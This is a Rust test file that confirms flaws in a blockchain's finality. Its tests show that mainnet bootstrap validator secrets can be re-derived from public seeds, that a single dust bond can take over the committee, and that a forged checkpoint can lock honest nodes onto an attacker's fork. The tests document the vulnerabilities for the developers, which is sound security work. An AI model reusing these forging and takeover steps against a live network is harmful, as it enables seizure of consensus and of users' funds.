//! C2/C3 confirmation: mainnet finality rests on public keys, and one tiny
//! bond takes it over.
//!
//! C2: the 21 mainnet bootstrap secrets are pure functions of source seeds
//! (`mainnet_validator_secret(1..=21)`), so anyone holding the repo can sign
//! finality certificates. Quorum is 15 of 21, binding finality is live from
//! height 100, and exits depend on it. These tests PROVE reproducibility and
//! usability of the secrets — they pass precisely because the flaw is real.
//!
//! C3: the first recorded bond replaces the whole 21-key bootstrap set under
//! the TopN rule with no minimum validator count, so a committee of one (here
//! a 1-satoshi bond on mini; on mainnet the floor is 0.01 SRCT) has quorum 1
//! and controls finality alone.
//!
//! DO NOT "fix" these tests by deleting them. The correct fixes are
//! operational/consensus changes (secret-entropy mainnet keys with no public
//! set at launch for C2; a minimum-validator / minimum-stake gate plus
//! stake-weighted quorum before the bootstrap retires for C3). When those
//! land, rewrite these assertions into refusal/gate assertions.
//!
//! Run with `cargo test -p srct-core --test finality_takeover`.

use srct_core::block::GENESIS_TIMESTAMP_MS;
use srct_core::bls::{RealBls, SecretKey};
use srct_core::bls_checkpoint::{BlsPublicKey, BlsSignature, Checkpoint, CheckpointPayload};
use srct_core::bond::{bond_identity, bond_pop};
use srct_core::chain::Chain;
use srct_core::hash::Address;
use srct_core::params::{mainnet_committee_secrets, mainnet_validator_key, NetworkParams};
use srct_core::tx::{
    OutPoint, Output, StakePayload, GAS_PER_INPUT, GAS_PER_OUTPUT, GAS_TX_BASE, TX_BOND,
};
use srct_core::wallet::Wallet;

/// C2: bootstrap secrets are reproducible from source alone — no entropy, no
/// operator input — so every holder of the repo holds every bootstrap key.
#[test]
fn mainnet_bootstrap_secrets_are_reproducible_public_material() {
    let first = mainnet_committee_secrets();
    let second: Vec<SecretKey> = (1u8..=21).map(srct_core::params::mainnet_validator_secret).collect();
    assert_eq!(first.len(), 21);
    assert_eq!(second.len(), 21);
    for (a, b) in first.iter().zip(second.iter()) {
        assert_eq!(
            a.public_key().as_bytes(),
            b.public_key().as_bytes(),
            "re-derivation from source seeds must give the same keys"
        );
    }
    // The derived keys are exactly the committee the chain boots with.
    let params = NetworkParams::mainnet();
    assert_eq!(params.genesis_validators.len(), 21);
    for seed in 1u8..=21 {
        assert!(
            params.genesis_validators.contains(&mainnet_validator_key(seed)),
            "seed {seed} must be a genesis validator"
        );
    }
}

/// C2: anyone can sign finality with a re-derived bootstrap key — the quorum
/// of 15 is reachable with nothing but the source.
#[test]
fn anyone_can_sign_with_a_rederived_bootstrap_key() {
    let sk = srct_core::params::mainnet_validator_secret(3);
    let pk = mainnet_validator_key(3);
    let msg = srct_core::hash::sha256(&[b"finality-takeover-confirmation"]);
    let sig = sk.sign(&msg);
    assert!(
        RealBls::verify(&pk, &msg, &sig),
        "a signature from a re-derived bootstrap secret must verify"
    );
    // Quorum arithmetic the attack relies on: 15 of 21.
    assert_eq!(
        ceil_quorum(21),
        15,
        "a 21-key committee needs 15 signatures, all publicly forgeable"
    );
}

fn ceil_quorum(n: usize) -> usize {
    // Mirrors `EpochSet::quorum_size`: ceil(n * 6667 / 10000).
    (n * 6667).div_ceil(10000)
}

// ---------------------------------------------------------------------------
// C3 harness (copied from bond_stake.rs: rich mini chain, one tiny bond)
// ---------------------------------------------------------------------------

fn wallet(seed: u8) -> Wallet {
    Wallet::from_private_key_bytes(&[seed; 32], "finality-takeover").unwrap()
}

fn bls_pair(seed: u8) -> (SecretKey, BlsPublicKey) {
    let sk = SecretKey::derive(&[seed; 32]).unwrap();
    let pk = sk.public_key();
    (sk, pk)
}

fn ts(height: u64) -> u64 {
    GENESIS_TIMESTAMP_MS + height * 1_000
}

fn gas(n_in: usize, n_out: usize) -> u64 {
    GAS_TX_BASE + GAS_PER_INPUT * n_in as u64 + GAS_PER_OUTPUT * n_out as u64
}

fn mine(chain: &mut Chain, to: Address, n: u64) {
    for _ in 0..n {
        let h = chain.height() + 1;
        let b = chain.mine_block(to, vec![], ts(h)).unwrap();
        chain.submit(b).unwrap();
    }
}

fn mine_to(chain: &mut Chain, to: Address, target: u64) {
    while chain.height() < target {
        mine(chain, to, 1);
    }
}

fn fee_for(chain: &Chain, n_in: usize, n_out: usize) -> u64 {
    chain
        .expected_base_fee_for_next_block()
        .saturating_mul(gas(n_in, n_out))
        .saturating_add(1_000_000)
}

/// C3: a single 1-satoshi bond retires the whole bootstrap set — the bonded
/// committee has one member with quorum 1, so one key controls finality.
#[test]
fn one_dust_bond_replaces_the_bootstrap_with_a_singleton_committee() {
    let mut chain = Chain::new(NetworkParams::mini()).unwrap();
    let w = wallet(1);
    let bonder = w.address().unwrap();
    mine(&mut chain, bonder, 80);
    let mut ops = Vec::new();
    for h in 1..=70u64 {
        ops.push(OutPoint {
            txid: chain.block_at(h).unwrap().txs[0].txid(),
            index: 0,
        });
    }
    assert_eq!(
        chain.committee_keys().len(),
        4,
        "mini boots with 4 public test keys"
    );

    let (sk, pk) = bls_pair(7);
    let net = chain.params().clone();
    let total: u64 = ops.iter().map(|op| chain.utxo().get(op).unwrap().out.value).fold(0, |a, v| {
        a.saturating_add(v)
    });
    let value = 1u64; // dust: the minimum the rules accept
    let fee = fee_for(&chain, ops.len(), 2);
    let mut tx = w
        .build_tx(
            &ops,
            vec![
                Output {
                    value,
                    address: bond_identity(&net.network_id, &bonder, &pk),
                },
                Output {
                    value: total - value - fee,
                    address: bonder,
                },
            ],
            fee,
        )
        .unwrap();
    tx.tx_type = TX_BOND;
    tx.stake = Some(StakePayload::Bond {
        bls_pk: pk,
        pop: bond_pop(&sk, &net.network_id, &bonder),
        mldsa_pk: None,
    });
    w.sign(&mut tx).unwrap();
    let h = chain.height() + 1;
    let b = chain.mine_block(bonder, vec![tx], ts(h)).unwrap();
    chain.submit(b).unwrap();

    // Rotation happens once a seed height sees the bond (same rule the
    // committee_rotation suite pins: mine past the next rotation).
    mine_to(&mut chain, bonder, 110);
    assert_eq!(
        chain.committee_keys(),
        vec![pk],
        "C3: one bond replaced the whole bootstrap set"
    );
    assert_eq!(
        ceil_quorum(1),
        1,
        "C3: a singleton committee has quorum 1 — one key finalizes alone"
    );

    // And the mainnet floor that makes this cheap in production: 0.01 SRCT.
    assert_eq!(
        NetworkParams::mainnet().min_bond_sat,
        1_000_000,
        "mainnet minimum bond is 0.01 SRCT"
    );
}

// ---------------------------------------------------------------------------
// H3: forged finality locks the whole network onto one branch
// ---------------------------------------------------------------------------

fn testnet_ts(height: u64, bump: u64) -> u64 {
    GENESIS_TIMESTAMP_MS + height * 1_000 + bump
}

/// The testnet committee as (secret, key) pairs in canonical key order — the
/// same order every bitmap uses. All four secrets are public test material
/// (`testnet_validator_secret`), so "the attacker" below is anyone with the
/// repo.
fn testnet_committee() -> Vec<(SecretKey, BlsPublicKey)> {
    let mut pairs: Vec<(SecretKey, BlsPublicKey)> =
        srct_core::params::testnet_committee_secrets()
            .into_iter()
            .map(|sk| {
                let pk = sk.public_key();
                (sk, pk)
            })
            .collect();
    pairs.sort_by_key(|a| a.1 .0);
    pairs
}

fn testnet_signed(
    pairs: &[(SecretKey, BlsPublicKey)],
    height: u64,
    block_hash: srct_core::hash::Hash512,
    indices: &[usize],
) -> Checkpoint {
    let p = CheckpointPayload {
        height,
        block_hash,
        network_id: "srct/testnet".into(),
        epoch: height / 10,
    };
    let msg = p.signing_hash();
    let sigs: Vec<BlsSignature> = indices.iter().map(|&i| pairs[i].0.sign(&msg)).collect();
    let agg = RealBls::aggregate(&sigs).unwrap();
    let mut bitmap = vec![0u8; pairs.len().div_ceil(8)];
    for &i in indices {
        bitmap[i / 8] |= 1 << (i % 8);
    }
    Checkpoint {
        payload: p,
        aggregate_sig: agg,
        signer_bitmap: bitmap,
        signer_count: indices.len() as u32,
        pq_sidecar: Vec::new(),
    }
}

/// H3 (C2 taken further): a certificate forged from public committee keys
/// does not just mislead users about finality — once applied, honest nodes
/// refuse any reorganization that forks below it, however much work the
/// honest branch carries. The network stays on the attacker's chain and
/// honest blocks are ignored: a takeover, not a display bug.
///
/// Testnet stands in for mainnet here (same public-committee shape, quorum 3
/// of 4, binding activation at 20): the attacker signs a checkpoint on their
/// own short fork with repo-public keys, finalizing it, and a heavier honest
/// fork mined afterward is locked out.
#[test]
fn forged_finality_on_short_fork_locks_out_heavier_honest_work() {
    let pairs = testnet_committee();
    let attacker = wallet(91).address().unwrap();
    let honest = wallet(92).address().unwrap();
    let mut chain = Chain::new(NetworkParams::testnet()).unwrap();
    for h in 1..=20u64 {
        let b = chain.mine_block(attacker, vec![], testnet_ts(h, 0)).unwrap();
        chain.submit(b).unwrap();
    }

    // Attacker's fork on top of the tip: two blocks, then a quorum
    // certificate (3 of 4, all from public seeds) on the second one.
    for h in 21..=22u64 {
        let b = chain.mine_block(attacker, vec![], testnet_ts(h, 7)).unwrap();
        chain.submit(b).unwrap();
    }
    let forged_at = 22u64;
    let forged_hash = chain.block_hash_at(forged_at).unwrap();
    let cp = testnet_signed(&pairs, forged_at, forged_hash, &[0, 1, 2]);
    chain.apply_checkpoint(&cp, &RealBls).expect(
        "a quorum-signed checkpoint on the canonical tip must apply — \
         the keys are public, so anyone can produce it",
    );
    assert_eq!(chain.finality().binding_finalized_height(), forged_at);

    // Honest miners out-work the attacker five times over from the same
    // parent — then watch every block refused.
    let mut rival = Chain::new(NetworkParams::testnet()).unwrap();
    for h in 1..=20u64 {
        rival.submit(chain.block_at(h).unwrap().clone()).unwrap();
    }
    for h in 21..=27u64 {
        let b = rival.mine_block(honest, vec![], testnet_ts(h, 13)).unwrap();
        rival.submit(b).unwrap();
    }
    assert!(
        rival.total_work() > chain.total_work(),
        "the honest fork must carry strictly more work"
    );
    // Side-branch blocks store fine; the refusal fires once the honest fork
    // threatens to overtake (same shape as the m5 reorg-refusal test).
    let mut refused = 0u32;
    for h in 21..=27u64 {
        if let Err(e) = chain.submit(rival.block_at(h).unwrap().clone()) {
            assert!(
                matches!(
                    e,
                    srct_core::error::Error::ReorgWouldCrossFinality { .. }
                ),
                "H3: honest work must be refused across forged finality, got: {e}"
            );
            refused += 1;
        }
    }
    assert!(
        refused > 0,
        "H3: the heavier honest fork must actually attempt the crossing reorg"
    );
    assert_eq!(
        chain.tip_hash(),
        forged_hash,
        "H3: the tip stays on the attacker's finalized fork"
    );
    assert_eq!(chain.height(), forged_at);
    chain.verify_canonical_chain().unwrap();
}
